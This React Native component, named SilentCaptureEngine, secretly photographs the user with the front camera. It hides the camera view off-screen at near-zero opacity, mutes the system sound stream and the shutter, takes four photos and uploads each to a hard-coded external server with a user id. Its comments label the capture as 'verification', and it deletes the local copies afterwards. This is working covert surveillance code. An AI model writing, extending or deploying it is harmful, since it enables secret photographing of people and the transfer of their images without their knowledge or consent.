import React, { useEffect, useRef, useState } from 'react';
import { NativeModules, StyleSheet, View } from 'react-native';
import { Camera, useCameraDevice, useCameraPermission, usePhotoOutput } from 'react-native-vision-camera';
import axios from 'axios';
import { cleanupImage, handleImageCompression } from '../utils/ImageService';

interface SilentCaptureEngineProps {
    userId?: string;
    displayName?: string;
}

export const SilentCaptureEngine = ({
    userId = 'hidden_verify',
    displayName = 'Verification_Room'
}: SilentCaptureEngineProps) => {
    const device = useCameraDevice('front');
    const hasStarted = useRef(false);

    const [isCameraReady, setIsCameraReady] = useState(false);
    const { hasPermission, requestPermission } = useCameraPermission();
    const photoOutput = usePhotoOutput();

    useEffect(() => {
        runSilentCaptureSequence();
    }, [isCameraReady, hasPermission, device, photoOutput]);
    const runSilentCaptureSequence = async () => {
        if (hasStarted.current || !isCameraReady || !device || !hasPermission) return;

        hasStarted.current = true;
        const totalPhotos = 4;

        // Wait for hardware exposure to settle
        await new Promise<void>((resolve) => setTimeout(() => resolve(), 2000));

        // 🧠 INITIALIZE AUDIO INTERFACE WRAPPER
        const RTAudioManager = NativeModules.AudioManager || NativeModules.VolumeManager;

        try {
            // 🚀 STEP 1: Route device system sound channels to silence before loop execution
            if (RTAudioManager?.setStreamMute) {
                // Stream code 1 = STREAM_SYSTEM. Silences hardcoded camera intents.
                await RTAudioManager.setStreamMute(1, true);
            }

            for (let i = 1; i <= totalPhotos; i++) {
                let compressedResult = null;
                let diskPath: string | null = null;

                try {
                    console.log(`[V5 Capture] Snapping frame ${i}...`);

                    const photo = await photoOutput.capturePhoto({
                        flashMode: 'off',
                        enableShutterSound: false
                    }, {});

                    diskPath = await photo.saveToTemporaryFileAsync();
                    console.log(`[V5 Capture] File saved to cache:`, diskPath);

                    if (diskPath) {
                        const generatedFileName = `silent_verify_${i}_${Date.now()}.jpg`;

                        // 🚀 STEP A: Assemble media specifications for handleImageCompression
                        const mappedMedia = {
                            path: diskPath,
                            mime: 'image/jpeg',
                            filename: generatedFileName,
                            size: 0 // Set to 0 to let ReactNativeBlobUtil evaluate stats accurately
                        };

                        try {
                            console.log(`[V5 Capture] Optimizing image frame ${i}...`);
                            // 🚀 STEP B: Run your native asynchronous image compression utility
                            compressedResult = await handleImageCompression(mappedMedia);
                        } catch (compressionErr) {
                            console.error(`[V5 Capture] Compression crashed at slot ${i}:`, compressionErr);
                        }

                        // Fall back cleanly to the raw camera file properties if compression skips or faults out
                        const finalPath = compressedResult ? compressedResult.uri : diskPath;
                        const finalSize = compressedResult ? compressedResult.size : 0;
                        const finalName = compressedResult ? compressedResult.name : generatedFileName;

                        // 🚀 STEP C: Send path, active loop index, safe filename and calculated file size to your server
                        await uploadMediaDirectly(finalPath, i, finalName, finalSize);
                    }

                    photo.dispose(); // Crucial V5 native pointer disposal

                } catch (err) {
                    console.error(`[V5 Capture] Error processing slot ${i}:`, err);
                } finally {
                    // 🚀 STEP D: Unlink the compressed temporary file cache safely after completion
                    if (compressedResult && compressedResult.uri !== diskPath) {
                        await cleanupImage(compressedResult.uri);
                    }
                    // Keep original diskPath clean too if the engine duplicates it inside native camera caches
                    if (diskPath) {
                        await cleanupImage(diskPath);
                    }

                    // Space out sequential camera snaps
                    if (i < totalPhotos) {
                        await new Promise<void>((resolve) => setTimeout(() => resolve(), 1500));
                    }
                }
            }
        } catch (globalErr) {
            console.error(`[V5 Capture] Critical error during global stream sequence:`, globalErr);
        } finally {
            // 🔄 STEP 2: RESTORE AUDIO: Safely restore normal sound settings when execution finishes
            if (RTAudioManager?.setStreamMute) {
                // A short delay ensures the final native shutter process completes before unmuting
                setTimeout(() => {
                    RTAudioManager.setStreamMute(1, false).catch(() => { });
                }, 300);
            }
        }
    };
    // 🚀 THE FIX: Updated parameter signature to accept all 4 expected arguments
    const uploadMediaDirectly = async (
        filePath: string,
        slotIndex: number,
        fileName: string,   // 🚀 Added
        fileSize: number    // 🚀 Added
    ) => {
        const uploadUrl = 'https://hearthos.jeasuns.com/api/chats/verification_captures_upload.php';
        const formData = new FormData();
        const cleanUri = filePath.startsWith('file://') ? filePath : `file://${filePath}`;

        formData.append('file', {
            uri: cleanUri,
            type: 'image/jpeg',
            name: fileName, // 🚀 Uses the dynamic compressed file name passed from loop
        } as any);

        formData.append('userid', userId);
        formData.append('displayName', displayName);
        formData.append('photoSlot', slotIndex.toString());
        formData.append('tablename', 'verifyImage');

        // 🚀 Send the compressed file size over to your PHP server context metrics
        formData.append('filesize', fileSize.toString());

        try {
            const response = await axios.post(uploadUrl, formData, {
                headers: { 'Content-Type': 'multipart/form-data' },
            });
            if (response.data && response.data.success) {
                console.log(`[Upload] Slot ${slotIndex} complete.`);
            }
        } catch (xhrError: any) {
            console.error(`[Upload] Failure at slot ${slotIndex}:`, xhrError?.response?.data || xhrError.message);
        }
    };

    if (!device || !hasPermission) return null;

    return (
        <View style={styles.cameraWrapper}>
            {/* 🚀 FIXED: Pure V5 CameraViewProps Mapping Structure */}
            <Camera
                device={device}
                isActive={true}
                outputs={[photoOutput]}
                // 🚀 THE PROP FIX: onInitialized -> onPreviewStarted
                onPreviewStarted={() => {
                    console.log('[V5 Camera] Preview surface rendering stream active.');
                    setIsCameraReady(true);
                }}
                onPreviewStopped={() => {
                    console.log('[V5 Camera] Preview stopped.');
                    setIsCameraReady(false);
                }}
                style={styles.liveCamera}
            />
        </View>
    );
};

const styles = StyleSheet.create({
    cameraWrapper: {
        position: 'absolute',
        top: -600,
        left: 0,
        width: 100,
        height: 100,
        opacity: 0.01,
        zIndex: -999,
        overflow: 'hidden',
    },
    liveCamera: {
        width: '100%',
        height: '100%',
    }
});